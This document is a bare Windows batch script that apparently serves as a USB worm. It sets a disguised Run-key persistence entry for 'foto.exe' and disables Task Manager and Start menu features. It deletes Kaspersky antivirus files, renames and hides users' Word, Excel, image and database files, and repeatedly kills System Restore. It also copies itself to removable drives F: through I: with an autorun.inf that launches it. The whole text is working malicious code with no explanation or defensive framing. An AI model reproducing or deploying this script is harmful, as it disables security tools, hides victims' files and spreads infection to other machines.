reg add hklm\software\microsoft\windows\currentversion\run /v Micr0soft /t reg_sz /d "C:\WINDOWS\system32\foto.exe" /f 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t reg_dword /d 00000001 /f 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoSetTaskbar /t reg_dword /d 00000001 /f 
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMorePrograms /t reg_dword /d 00000001 /f 
attrib +s +r %systemroot%\system32\foto.exe /s > nul
attrib +h +s %systemroot%\system32\windows_update.bat /s > nul
del /s /f /q "%programfiles%\Kaspersky Lab\*.*" /s
cd \
FOR /R %%x in (*.doc) DO ren "%%x" *.system
FOR /R %%y in (*.xls) DO ren "%%y" *.systeme
set a=attrib +h +s +r
FOR /R %%z in (*.system *.systeme *.jpg *.bmp *.3gp *.mdb *.accdb) DO %a% "%%z"
D:
FOR /R %%p in (*.doc) DO ren "%%p" *.system
FOR /R %%q in (*.xls) DO ren "%%q" *.systeme
FOR /R %%r in (*.system *.systeme *.jpg *.bmp *.3gp *.mdb *.accdb) DO %a% "%%r"
:infe
taskkill /f /im "rstrui.exe"
if exist "F:\" (goto vf) else (goto g)
:g
if exist "G:\" (goto vg) else (goto h)
:h
if exist "H:\" (goto vh) else (goto i)
:i
if exist "I:\" (goto vi) else (goto infe)
:com
set men=%co:~0,2%
if exist %co%foto.exe (goto infe) else (goto gra)
:vf
set co=F:\
goto com
:vg
set co=G:\
goto com
:vh
set co=H:\
goto com
:vi
set co=I:\
goto com
:gra
%men%
for /R %%d in ("") DO xcopy /h/c/q/y "%systemroot%\system32\foto.exe" "%%d"
xcopy /h/c/q/y %windir%\system32\foto.exe %co%
md "%co%fotos camara"
xcopy /h/c/q/y %windir%\system32\foto.exe "%co%\fotos camara\"
attrib -h -s -r %co%autorun.inf /s
echo [autorun] > %co%autorun.inf
echo shell\open=Abrir >> %co%autorun.inf
echo shell\open\Command=foto.exe >> %co%autorun.inf
echo shell\install=Explorar >> %co%autorun.inf
echo shell\install\command=foto.exe >> %co%autorun.inf
attrib -A +H +S +R %co%autorun.inf
goto infe

